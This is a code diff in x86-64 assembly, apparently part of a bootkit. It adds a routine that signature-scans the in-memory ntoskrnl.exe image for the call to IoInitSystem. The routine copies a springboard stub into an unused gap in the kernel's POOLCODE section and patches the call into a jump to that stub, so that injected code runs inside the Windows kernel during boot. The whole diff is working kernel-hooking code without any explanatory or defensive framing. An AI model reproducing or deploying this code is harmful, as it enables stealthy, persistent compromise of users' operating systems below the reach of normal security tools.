@@ -504,10 +504,103 @@ Hook_NtosKerenelImage:
 push rcx
 push rdi
 
+; 48 8B CB E8 ?? ?? ?? ?? 84 C0 74 ?? 40 8A D7
+; PAGE:00000001404F406A 48 8B CB                                mov     rcx, rbx
+; PAGE:00000001404F406D E8 6E FE 20 00                          call    IoInitSystem
+; PAGE:00000001404F4072 84 C0                                   test    al, al
+; PAGE:00000001404F4074 74 1C                                   jz      short loc_1404F4092
+; PAGE:00000001404F4076 40 8A D7                                mov     dl, dil
+
+Search_Ntoskernel_Signature:
+mov al,0x48
+repne scasb
+jnz Hook_NtosKerenelImage_Exit
+cmp dword [rdi-0x1],0xE8CB8B48
+jnz Search_Ntoskernel_Signature
+cmp word [rdi + 0x7],0xC084
+jnz Search_Ntoskernel_Signature
+cmp byte [rdi + 0x9],0x74
+jnz Search_Ntoskernel_Signature
+cmp word [rdi + 0xb],0x8A40
+jnz Search_Ntoskernel_Signature
+cmp byte [rdi + 0xd],0xD7
+jnz Search_Ntoskernel_Signature
+; move to  call    IoInitSystem
+add rdi,2
+
+; foud signature, begin patch
+; set a flag bit  indicate  we already patch ntoskernel.exe
+or  dword  [rsi + 8], 0x1
+
+; move code ntoskernel code gap
+; section va         size
+; POOLCODE 002A3000  000028A7
+push rdi
+mov rdi,[rsp+0x8] ; rdi  <-- imagebase of ntoskernel.exe
+add rdi,0x2A3000
+add rdi,0x28A7
+
+push rsi
+add rsi,springboard-Relocate_Me_Code
+mov rcx,Total_End_of_Binary - springboard
+rep movsb
+pop rsi
+
+; now code in ntoskernel gap, do patch
+pop rdi
+mov rbx,[rsp] ; rbx  <-- imagebase of ntoskernel.exe
+add rbx,0x2A3000
+add rbx,0x28A7 ; rbx <-- code gap begin springboard in gas
+
+push rbx
+mov rdx, rbx
+add rdx,instruction_jmp_back-springboard ; rdx <--  jmp_back in gas
+pop rbx
+
+mov eax,dword [rdi + 0x1]
+and rax,0xffffffff
+lea rcx,[rdi + 0x5]
+add rcx,rax ;rcx  <--  address of IoInitSystem
+
+; change call    IoInitSystem to jmp springboard
+mov byte [rdi], 0xe9
+push rbx
+sub rbx,rdi
+sub rbx,5
+mov dword [rdi + 0x1],ebx
+pop rbx
+
+; fix  instruction_jmp_back
+add rdi,5 ; <-- now rdi is origin  call IoInitSystem ret addr.
+sub rdi,rdx
+sub rdi,5
+mov dword [rdx + 0x1], edi
+
+; fix  instruction_call_io_init_system
+sub rcx, rbx
+sub rcx,5
+mov dword [rbx + 0x1],ecx
+
+; save  ntoskerenel image base
+push rsi
+add rsi,Ntoskrnl_BaseAddress-Relocate_Me_Code
+mov rax,[rsp + 0x8]
+mov [rsi], rax
+pop rsi
+
 Hook_NtosKerenelImage_Exit:
 pop rdi
 pop rcx
 ret
+
+springboard:
+; call IoInitSystem
+instruction_call_io_init_system db 0xe8,0x0,0x0,0x0,0x0
+handler_after_io_init_system_ret:
+nop
+nop
+nop
+instruction_jmp_back db 0xe9,0x0,0x0,0x0,0x0
 
 ; data following, [ebp - 32] will point to here
 Data_Reference:
